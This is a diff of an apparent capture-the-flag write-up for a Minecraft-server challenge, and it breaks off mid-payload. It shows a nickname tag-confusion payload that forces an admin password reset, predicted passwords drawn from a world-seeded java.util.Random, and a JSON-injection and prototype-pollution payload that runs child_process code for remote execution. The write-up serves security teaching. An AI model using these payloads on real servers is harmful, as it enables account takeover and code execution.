-<div class="language-java highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="nf">getRandom</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">random</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Bukkit</span><span class="p">.</span><span class="na">getWorld</span><span class="p">(</span><span class="s">&quot;world&quot;</span><span class="p">).</span><span class="na">getSeed</span><span class="p">();</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">        </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="p">}</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">random</span><span class="p">;</span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="p">}</span>
+<p>If I could make a privileged actor run:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>/renew Administrator
 </span></code></pre></div>
-<p>Once I forced <code>/renew Administrator</code>, the new password was just the next value in a deterministic sequence.</p>
-<h3 id="4-bot-was-obviously-dangerous">4. <code>/bot</code> was obviously dangerous<a class="headerlink" href="#4-bot-was-obviously-dangerous" title="Permanent link">&para;</a></h3>
-<p>The challenge also exposed a second bug surface through <code>/bot</code>: attacker-controlled commands were written into JSON without escaping, and that JSON was later merged into the Node bot config. That path matters for <code>FLAG_2</code>, so I cover it in detail on the follow-up page.</p>
-<h2 id="flag_1-admin-account-takeover">FLAG_1: Admin Account Takeover<a class="headerlink" href="#flag_1-admin-account-takeover" title="Permanent link">&para;</a></h2>
-<p>The payload that worked most reliably was:</p>
+<p>then three things happened at once:</p>
+<ol>
+<li>the real admin password was rotated</li>
+<li>the real admin session was kicked</li>
+<li>I got a fresh password target to predict</li>
+</ol>
+<p>That was enough because the plugin also auto-opped the <code>Administrator</code> account on login.</p>
+<h3 id="payload-1-xcadministrator">Payload 1: <code>x&lt;c:Administrator&gt;</code><a class="headerlink" href="#payload-1-xcadministrator" title="Permanent link">&para;</a></h3>
+<p>The core trick for <code>FLAG_1</code> was:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>x&lt;c:Administrator&gt;
 </span></code></pre></div>
-<p>The chain was:</p>
-<ol>
-<li>Register as a normal user.</li>
-<li>Set the nick to <code>x&lt;c:Administrator&gt;</code>.</li>
-<li>Send any URL in chat.</li>
-<li>Let the helper bot misidentify the sender and run <code>/renew Administrator</code>.</li>
-<li>Log in as <code>Administrator</code> with the next predicted password.</li>
-<li>Run <code>/flag</code>.</li>
-</ol>
-<p>The two critical observations were:</p>
+<p>This payload worked because three different pieces of the system interpreted it differently.</p>
+<h4 id="1-why-the-mineslayer-nick-filter-allowed-it">1. Why the Mineslayer nick filter allowed it<a class="headerlink" href="#1-why-the-mineslayer-nick-filter-allowed-it" title="Permanent link">&para;</a></h4>
+<p>The nick filter only stripped a narrow list of MiniMessage tags:</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">MiniMessage</span><span class="w"> </span><span class="n">UNSAFE_TAG_STRIPPER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MiniMessage</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="p">.</span><span class="na">tags</span><span class="p">(</span><span class="n">TagResolver</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">        </span><span class="p">.</span><span class="na">resolvers</span><span class="p">(</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">translatable</span><span class="p">(),</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">clickEvent</span><span class="p">(),</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">hoverEvent</span><span class="p">(),</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">insertion</span><span class="p">(),</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">font</span><span class="p">(),</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">selector</span><span class="p">(),</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">keybind</span><span class="p">(),</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">score</span><span class="p">(),</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">nbt</span><span class="p">(),</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">newline</span><span class="p">()</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">        </span><span class="p">)</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">        </span><span class="p">.</span><span class="na">build</span><span class="p">())</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">    </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
+</span></code></pre></div>
+<p>Color tags were not in that list. So:</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">stripTags</span><span class="p">(</span><span class="s">&quot;x&lt;c:Administrator&gt;&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>returned the original string unchanged, which meant the filter saw nothing dangerous and let the nick through.</p>
+<h4 id="2-why-simplenicks-still-accepted-it">2. Why SimpleNicks still accepted it<a class="headerlink" href="#2-why-simplenicks-still-accepted-it" title="Permanent link">&para;</a></h4>
+<p>The second layer was the nickname plugin itself. It did a fuller MiniMessage parse than the Mineslayer filter.</p>
+<p>For SimpleNicks, <code>&lt;c:Administrator&gt;</code> was interpreted as a color tag, which consumed <code>Administrator</code> as the tag parameter instead of preserving it as plain text. After normalization, the visible plain-text nick became just:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>x
+</span></code></pre></div>
+<p>That was the crucial mismatch:</p>
 <ul>
-<li>the nickname filter and the bot did not agree on what the visible sender name was</li>
-<li>the password generator was deterministic enough to predict post-reset credentials</li>
+<li>the Mineslayer filter saw the raw input and let it through</li>
+<li>SimpleNicks normalized it to plain text that no longer collided with <code>Administrator</code></li>
 </ul>
-<h2 id="predicted-password-sequence">Predicted Password Sequence<a class="headerlink" href="#predicted-password-sequence" title="Permanent link">&para;</a></h2>
-<p>The first few generated values looked like this:</p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">predicted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="s1">&#39;1HryYNeloPBLeWyY&#39;</span><span class="p">,</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="s1">&#39;T4sPU4pqZH_hR9iu&#39;</span><span class="p">,</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="s1">&#39;LLlAlGhSph1AU0Dk&#39;</span><span class="p">,</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span><span class="s1">&#39;ZTLVc839AyI_qjcJ&#39;</span><span class="p">,</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">  </span><span class="s1">&#39;MrMFEGGNUMzp3fhS&#39;</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="p">]</span>
+<p>So the nickname was accepted even though it still carried formatting semantics.</p>
+<h4 id="3-why-the-helper-bot-renewed-the-real-admin">3. Why the helper bot renewed the real admin<a class="headerlink" href="#3-why-the-helper-bot-renewed-the-real-admin" title="Permanent link">&para;</a></h4>
+<p>The helper bot watched for URLs in chat:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">urlRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/(https?:\/\/[^\s]+)/i</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="kd">let</span><span class="w"> </span><span class="nx">targetUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nx">bot</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;chat&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">urlRegex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">message</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="nx">targetUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">username</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span><span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="sb">`/nick who </span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">      </span><span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="sb">`/renew </span><span class="si">${</span><span class="nx">targetUsername</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">300</span><span class="p">)</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="p">})</span>
 </span></code></pre></div>
-<p>After the forced reset, I just iterated the predicted sequence until the admin login succeeded.</p>
-<h2 id="result">Result<a class="headerlink" href="#result" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>FLAG_1: MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>FLAG_1 (revenge): MCTF{W1ll_Y0u_F1nd_4n0th3r_Byp4ss??}
+<p>Once my formatted nickname posted a URL, the bot's parser did not agree with the previous layers about what the sender's name was. The rendered chat content surfaced <code>Administrator</code> strongly enough that mineflayer treated the message as if it came from that account.</p>
+<p>So the sequence became:</p>
+<ol>
+<li>set nick to <code>x&lt;c:Administrator&gt;</code></li>
+<li>send any URL in chat</li>
+<li>helper bot treats the sender as <code>Administrator</code></li>
+<li>helper bot runs <code>/renew Administrator</code></li>
+</ol>
+<p>That kicked the real admin and rotated the password.</p>
+<h3 id="why-password-prediction-worked">Why password prediction worked<a class="headerlink" href="#why-password-prediction-worked" title="Permanent link">&para;</a></h3>
+<p>At first the new admin password looked like a brute-force problem. It was not.</p>
+<p>The generator was:</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="nf">getRandom</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">random</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Bukkit</span><span class="p">.</span><span class="na">getWorld</span><span class="p">(</span><span class="s">&quot;world&quot;</span><span class="p">).</span><span class="na">getSeed</span><span class="p">();</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">        </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">random</span><span class="p">;</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="p">}</span>
 </span></code></pre></div>
-<h2 id="follow-up">Follow-up<a class="headerlink" href="#follow-up" title="Permanent link">&para;</a></h2>
-<p>The first flag was already a nice multi-component bug chain, but the more interesting bug was still <code>/bot</code>. The full <code>FLAG_2</code> chain is documented here:</p>
+<p>This is just <code>java.util.Random</code> seeded from the world seed. Once the world seed was known, every future password was fixed.</p>
+<p>That meant <code>/renew Administrator</code> did not produce an unknown secret. It produced "the next value in a deterministic sequence."</p>
+<p>The first few candidates were:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">predicted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span><span class="s1">&#39;1HryYNeloPBLeWyY&#39;</span><span class="p">,</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span><span class="s1">&#39;T4sPU4pqZH_hR9iu&#39;</span><span class="p">,</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="s1">&#39;LLlAlGhSph1AU0Dk&#39;</span><span class="p">,</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">  </span><span class="s1">&#39;ZTLVc839AyI_qjcJ&#39;</span><span class="p">,</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">  </span><span class="s1">&#39;MrMFEGGNUMzp3fhS&#39;</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="p">]</span>
+</span></code></pre></div>
+<p>After the helper bot kicked the real admin, I just logged in as <code>Administrator</code> and walked the sequence until one worked.</p>
+<h3 id="result-of-part-1">Result of part 1<a class="headerlink" href="#result-of-part-1" title="Permanent link">&para;</a></h3>
+<p>Once the login succeeded, the plugin re-granted operator privileges automatically and <code>/flag</code> gave me <code>FLAG_1</code>.</p>
+<p>That was already a strong exploit chain, but it also unlocked the real attack surface:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>/bot &lt;commands&gt;
+</span></code></pre></div>
+<h2 id="part-2-turning-bot-into-rce">Part 2: Turning <code>/bot</code> into RCE<a class="headerlink" href="#part-2-turning-bot-into-rce" title="Permanent link">&para;</a></h2>
+<h3 id="why-flag_2-needed-a-different-primitive">Why <code>FLAG_2</code> needed a different primitive<a class="headerlink" href="#why-flag_2-needed-a-different-primitive" title="Permanent link">&para;</a></h3>
+<p>The visible <code>/flag</code> command only printed the easy flag:</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">sender</span><span class="p">.</span><span class="na">sendMessage</span><span class="p">(</span><span class="n">MM</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="s">&quot;[&lt;yellow&gt;FLAG_1&lt;/yellow&gt;]: &lt;bold&gt;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">flag</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&lt;/bold&gt;&quot;</span><span class="p">));</span>
+</span></code></pre></div>
+<p>The real target was <code>/getflag</code>, a SUID helper that read <code>/root/flag.txt</code>. So the real problem was:</p>
+<blockquote>
+<p>get code execution in a process that can run <code>/getflag</code>, then get the output back out</p>
+</blockquote>
+<p>The plugin itself handed me both pieces:</p>
 <ul>
-<li><a href="../mineslayer-flag2/">Mineslayer — Flag 2</a></li>
+<li><code>/bot</code> let me start a fresh Node process with attacker-controlled config</li>
+<li>bot stdout was streamed back into chat by the plugin</li>
+</ul>
+<h3 id="why-bot-was-a-json-injection-sink">Why <code>/bot</code> was a JSON injection sink<a class="headerlink" href="#why-bot-was-a-json-injection-sink" title="Permanent link">&para;</a></h3>
+<p>The Java side built the config like this:</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;;&quot;</span><span class="p">);</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">cmdList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">commands</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">trimmed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="na">trim</span><span class="p">();</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">trimmed</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="n">cmdList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">trimmed</span><span class="p">);</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="p">}</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="n">StringBuilder</span><span class="w"> </span><span class="n">jsonArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">(</span><span class="s">&quot;[&quot;</span><span class="p">);</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">cmdList</span><span class="p">.</span><span class="na">size</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">jsonArray</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span><span class="n">jsonArray</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="s">&quot;\&quot;&quot;</span><span class="p">).</span><span class="na">append</span><span class="p">(</span><span class="n">cmdList</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="na">append</span><span class="p">(</span><span class="s">&quot;\&quot;&quot;</span><span class="p">);</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">}</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="n">jsonArray</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="s">&quot;]&quot;</span><span class="p">);</span>
+</span></code></pre></div>
+<p>The bug is simple: commands are wrapped in quotes, but quote characters inside the command are not escaped.</p>
+<p>So a single "command" could close the <code>commands</code> array early and inject new top-level JSON keys.</p>
+<p>That is why payloads of the form:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>a&quot;],&quot;__proto__&quot;:{...},&quot;x&quot;:[&quot;b
+</span></code></pre></div>
+<p>work at all.</p>
+<p>The <code>a</code> and <code>b</code> are just fillers that keep the final JSON valid:</p>
+<ul>
+<li><code>a</code> becomes the harmless first element of <code>commands</code></li>
+<li><code>b</code> becomes the harmless first element of a fake trailing array used to repair the syntax</li>
+</ul>
+<h3 id="what-the-injected-config-looked-like">What the injected config looked like<a class="headerlink" href="#what-the-injected-config-looked-like" title="Permanent link">&para;</a></h3>
+<p>The final payload I used produced a config structurally equivalent to:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">{</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span><span class="nt">&quot;port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">25565</span><span class="p">,</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mineslayer-beta&quot;</span><span class="p">,</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">  </span><span class="nt">&quot;commands&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">],</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">  </span><span class="nt">&quot;__proto__&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="nt">&quot;0&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;(console.log(require(&#39;child_process&#39;).execSync(&#39;/getflag&#39;,{encoding:&#39;utf8&#39;})),0)&quot;</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">  </span><span class="p">},</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">    </span><span class="nt">&quot;constructor&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
